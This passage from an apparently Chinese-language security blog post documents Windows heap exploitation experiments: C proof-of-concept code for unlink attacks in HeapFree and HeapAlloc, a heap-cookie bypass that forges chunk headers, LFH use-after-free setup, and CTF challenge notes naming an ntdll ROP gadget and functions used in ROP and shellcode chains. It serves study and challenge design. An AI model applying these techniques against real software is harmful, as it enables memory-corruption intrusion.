ptr[<span class="number">0</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">1</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	ptr[<span class="number">2</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">3</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	ptr[<span class="number">4</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">1</span>]);</span><br><span class="line">	<span class="comment">//HeapFree(hHeap, 0, ptr[3]);                                  // &lt; == change point</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;ptr[<span class="number">1</span>], ptr[<span class="number">1</span>]);</span><br><span class="line">	*(<span class="keyword">void</span>**)(ptr[<span class="number">1</span>]) = &amp;ptr[<span class="number">1</span>] - <span class="number">1</span>;</span><br><span class="line">	*(<span class="keyword">void</span>**)(ptr[<span class="number">1</span>] + <span class="number">8</span>) = &amp;ptr[<span class="number">1</span>];</span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;ptr[<span class="number">1</span>], ptr[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"success!!!\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>失败案例3：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hHeap = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span>* ptr[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	hHeap = HeapCreate(HEAP_NO_SERIALIZE, <span class="number">0x2000</span>, <span class="number">0x2000</span>);</span><br><span class="line">	<span class="comment">//system("pause");</span></span><br><span class="line">	ptr[<span class="number">0</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">1</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	ptr[<span class="number">2</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">3</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	ptr[<span class="number">4</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">3</span>]);                      <span class="comment">// &lt; == change point</span></span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">1</span>]);                      <span class="comment">// &lt; == change point</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;ptr[<span class="number">1</span>], ptr[<span class="number">1</span>]);</span><br><span class="line">	*(<span class="keyword">void</span>**)(ptr[<span class="number">1</span>]) = &amp;ptr[<span class="number">1</span>] - <span class="number">1</span>;</span><br><span class="line">	*(<span class="keyword">void</span>**)(ptr[<span class="number">1</span>] + <span class="number">8</span>) = &amp;ptr[<span class="number">1</span>];</span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>, &amp;ptr[<span class="number">1</span>], ptr[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"success!!!\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结论：</p>
<p><strong>被<code>unlink</code>的<code>chunk</code>不能被对应<code>size</code>的<code>LFH</code>指向。</strong>因为<code>LFH</code>会检测<code>next_chunk</code>的<code>size</code>是否和当前<code>chunk</code>的<code>size</code>一样，所以会有<code>decode(ptr-&gt;Flink-&gt;header)</code>，并且检查<code>checksum</code>的过程，因为这时候的<code>Flink</code>已经被我们破坏，所以会检测失败，从而崩溃。所以我们想要成功<code>unlink</code>的方式主要有两种：</p>
<ul>
<li>在<code>free</code>目标<code>chunk</code>后，再<code>free</code>一个相同<code>size</code>的<code>chunk</code>来替换掉对应<code>size</code>的<code>LFH</code>。</li>
<li>在<code>free</code>目标<code>chunk</code>后，在其<code>Flink</code>指向的位置<code>-8</code>处伪造一个<code>header</code>。</li>
</ul>
<h5 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h5><p>经测试与<code>x64</code>情况相同。</p>
<h4 id="在HeapAlloc中触发unlink"><a href="#在HeapAlloc中触发unlink" class="headerlink" title="在HeapAlloc中触发unlink:"></a>在HeapAlloc中触发unlink:</h4><h5 id="x64-1"><a href="#x64-1" class="headerlink" title="x64"></a>x64</h5><p>成功案例1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hHeap = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span>* ptr[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	hHeap = HeapCreate(HEAP_NO_SERIALIZE, <span class="number">0x2000</span>, <span class="number">0x2000</span>);</span><br><span class="line">	<span class="comment">//system("pause");</span></span><br><span class="line">	ptr[<span class="number">0</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">1</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	ptr[<span class="number">2</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">3</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	ptr[<span class="number">4</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">5</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	ptr[<span class="number">6</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">1</span>]);</span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">3</span>]);</span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">5</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>, ptr[<span class="number">5</span>]);</span><br><span class="line">	*(<span class="keyword">long</span>*)(ptr[<span class="number">1</span>]) = <span class="number">0xdeadbeef</span>;</span><br><span class="line">	*(<span class="keyword">long</span>*)(ptr[<span class="number">1</span>] + <span class="number">8</span>) = <span class="number">0xdeadbeef</span>;</span><br><span class="line">	ptr[<span class="number">7</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>, ptr[<span class="number">7</span>]);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>失败案例1：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hHeap = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span>* ptr[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	hHeap = HeapCreate(HEAP_NO_SERIALIZE, <span class="number">0x2000</span>, <span class="number">0x2000</span>);</span><br><span class="line">	<span class="comment">//system("pause");</span></span><br><span class="line">	ptr[<span class="number">0</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">1</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	ptr[<span class="number">2</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">3</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	ptr[<span class="number">4</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	<span class="comment">//ptr[5] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x28);</span></span><br><span class="line">	<span class="comment">//ptr[6] = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x20);</span></span><br><span class="line"></span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">1</span>]);</span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">3</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>,ptr[<span class="number">3</span>]);</span><br><span class="line">	*(<span class="keyword">long</span>*)(ptr[<span class="number">1</span>]) = <span class="number">0xdeadbeef</span>;</span><br><span class="line">	*(<span class="keyword">long</span>*)(ptr[<span class="number">1</span>] + <span class="number">8</span>) = <span class="number">0xdeadbeef</span>;</span><br><span class="line">	ptr[<span class="number">5</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>,ptr[<span class="number">5</span>]);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>失败原因：因为在对应<code>size</code>的<code>LFH</code>中有<code>chunk</code>，也就是<code>ptr[3]</code>，所以会将<code>ptr[3]</code>解链，解链时的检测：<code>Q-&gt;Flink-Blink == Q</code>没过，因为此时的<code>Q-&gt;Flink</code>也就是<code>ptr[1]</code>的<code>Blink</code>已经被我们篡改为非法。对比可知成功案例1的成功原因。</p>
<p>成功案例2：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hHeap = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span>* ptr[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	hHeap = HeapCreate(HEAP_NO_SERIALIZE, <span class="number">0x2000</span>, <span class="number">0x2000</span>);</span><br><span class="line">	<span class="comment">//system("pause");</span></span><br><span class="line">	ptr[<span class="number">0</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">1</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	ptr[<span class="number">2</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">3</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	ptr[<span class="number">4</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line">	ptr[<span class="number">5</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	ptr[<span class="number">6</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">	HeapFree(hHeap, <span class="number">0</span>, ptr[<span class="number">3</span>]);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> header1 = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*)(ptr[<span class="number">1</span>] - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"header1 = %p\n"</span>,header1);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cookie = header1 ^ <span class="number">0x0800000302010003</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"cookie = %p\n"</span>,cookie);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> header2 = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*)(ptr[<span class="number">3</span>] - <span class="number">8</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> real_header2 = cookie ^ header2;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"real_header2 = %p\n"</span>,real_header2);</span><br><span class="line">	*(<span class="keyword">void</span>**)(ptr[<span class="number">3</span>]) = &amp;ptr[<span class="number">3</span>] - <span class="number">1</span>;</span><br><span class="line">	*(<span class="keyword">void</span>**)(ptr[<span class="number">3</span>] + <span class="number">8</span>) = &amp;ptr[<span class="number">3</span>];</span><br><span class="line">	ptr[<span class="number">1</span>] = (<span class="keyword">char</span>*)(cookie ^ <span class="number">0x0800000405010004</span>);</span><br><span class="line">	ptr[<span class="number">7</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x28</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%p: %p\n"</span>,&amp;ptr[<span class="number">3</span>],ptr[<span class="number">3</span>]);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结论：想要在<code>HeapAlloc</code>中触发<code>unlink</code>成功，需要两个条件：</p>
<ul>
<li><code>Flink</code>指向的位置<code>-8</code>处需要伪造一个<code>header</code>。</li>
<li>因为申请后返回的<code>chunk</code>肯定是对应<code>size</code>的<code>LFH</code>指向的<code>chunk</code>，所以我们修改的<code>Flink&amp;Blink</code>也必须是那个<code>chunk</code>，若不是的话，就可能发生失败案例1的情况。</li>
</ul>
<h5 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h5><p>与<code>x64</code>情况类似。</p>
<h2 id="FrontEnd-UAF"><a href="#FrontEnd-UAF" class="headerlink" title="FrontEnd-UAF"></a>FrontEnd-UAF</h2><h3 id="关于LFH的实验："><a href="#关于LFH的实验：" class="headerlink" title="关于LFH的实验："></a>关于LFH的实验：</h3><h4 id="需要注意的点"><a href="#需要注意的点" class="headerlink" title="需要注意的点"></a>需要注意的点</h4><p>在调试态下不会开启，只能<code>attach</code>上去调试。</p>
<p>需要用<code>HeapCreate(HEAP_GROWABLE, 0, 0)</code>创建新堆，用<code>HeapCreate(HEAP_NO_SERIALIZE, 0x2000, 0x2000)</code>不会开启<code>LFH</code>。</p>
<p>申请19个<code>chunk</code>之后，<strong>第20个<code>chunk</code>是第一个在<code>UserBlock</code>分配的<code>chunk</code></strong>。</p>
<p>需关注<code>_HEAP+0x198(FrontEndHeap)</code>和<code>_HEAP+0x1a8(FrontEndHeapUsageData)</code>处的数据。<code>FrontEndHeap</code>在第19次申请之后会初始化为<code>_LFH_HEAP</code>，<code>FrontEndHeapUsageData</code>指向一块<code>chunk</code>，里面记录着每个<code>size</code>的<code>chunk</code>被分配的次数，每被分配一次就增长<code>0x21</code>。到达一个阈值就会归零并开启对应<code>size</code>的<code>LFH</code>。</p>
<p>每个<code>UserBlock</code>大概会有<code>25</code>个<code>chunk</code>。。。我测试时是<code>25</code>个，可能具体需要看情况。</p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE hHeap = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">char</span>* ptr[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//char name[0x20];</span></span><br><span class="line">	<span class="comment">//setvbuf(stdout, NULL, _IONBF, 0);</span></span><br><span class="line">	<span class="comment">//setvbuf(stdin, NULL, _IONBF, 0);</span></span><br><span class="line"></span><br><span class="line">	hHeap = HeapCreate(HEAP_GROWABLE, <span class="number">0</span>, <span class="number">0</span>);  <span class="comment">// &lt; == important！！！</span></span><br><span class="line">	<span class="comment">//puts("who are you:");</span></span><br><span class="line">	<span class="comment">//_read(0, name, 0x20);</span></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">19</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		ptr[<span class="number">0</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	ptr[<span class="number">1</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[1],'\x11',0x40);</span><br><span class="line">	ptr[<span class="number">2</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[2], '\x22', 0x40);</span><br><span class="line">	ptr[<span class="number">3</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[3], '\x33', 0x40);</span><br><span class="line">	ptr[<span class="number">4</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[4], '\x44', 0x40);</span><br><span class="line">	ptr[<span class="number">5</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[5], '\x55', 0x40);</span><br><span class="line">	ptr[<span class="number">6</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[6], '\x66', 0x40);</span><br><span class="line">	ptr[<span class="number">7</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[7], '\x77', 0x40);</span><br><span class="line">	ptr[<span class="number">8</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[8], '\x88', 0x40);</span><br><span class="line">	ptr[<span class="number">9</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[9], '\x99', 0x40);</span><br><span class="line">	ptr[<span class="number">10</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[10], '\xaa', 0x40);</span><br><span class="line">	ptr[<span class="number">11</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[11], '\xbb', 0x40);</span><br><span class="line">	ptr[<span class="number">12</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[12], '\xcc', 0x40);</span><br><span class="line">	ptr[<span class="number">13</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[13], '\xdd', 0x40);</span><br><span class="line">	ptr[<span class="number">14</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[14], '\xee', 0x40);</span><br><span class="line">	ptr[<span class="number">15</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[15], '\xff', 0x40);</span><br><span class="line">	ptr[<span class="number">16</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[16], '\xf0', 0x40);</span><br><span class="line">	ptr[<span class="number">17</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[17], '\xf1', 0x40);</span><br><span class="line">	ptr[<span class="number">18</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[18], '\xf2', 0x40);</span><br><span class="line">	ptr[<span class="number">19</span>] = (<span class="keyword">char</span>*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, <span class="number">0x40</span>);</span><br><span class="line">	memset(ptr[19], '\xf3', 0x40);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="出题笔记"><a href="#出题笔记" class="headerlink" title="出题笔记"></a>出题笔记</h1><p>关闭代码优化，<code>VC++</code>编译器：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize( <span class="meta-string">""</span>, off )</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize( <span class="meta-string">""</span>, on )</span></span><br></pre></td></tr></table></figure>
<p><code>VS</code>新建项目时选空项目。</p>
<p><code>x64</code>下一个通用的<code>gadget</code>，本机的<code>ntdll</code>库里的位置在：<code>0x8FB20</code>，内容为<code>pop_rdx_rcx_r8_r9_r10_r11_ret</code></p>
<p><code>rop/ucrtbase</code>流派：<code>ucrtbase!_open</code>，<code>ucrtbase!_read</code>，<code>ucrtbase!puts/_write</code></p>
<p><code>shellcode/KERNEL32</code>流派：<code>KERNEL32!VirtualProtectStub</code>，<code>KERNEL32!ReadFile</code>，<code>KERNEL32!CreateFileA</code>，<code>KERNEL32!GetStdHandleStub</code>，<code>KERNEL32!WriteFile</code></p>
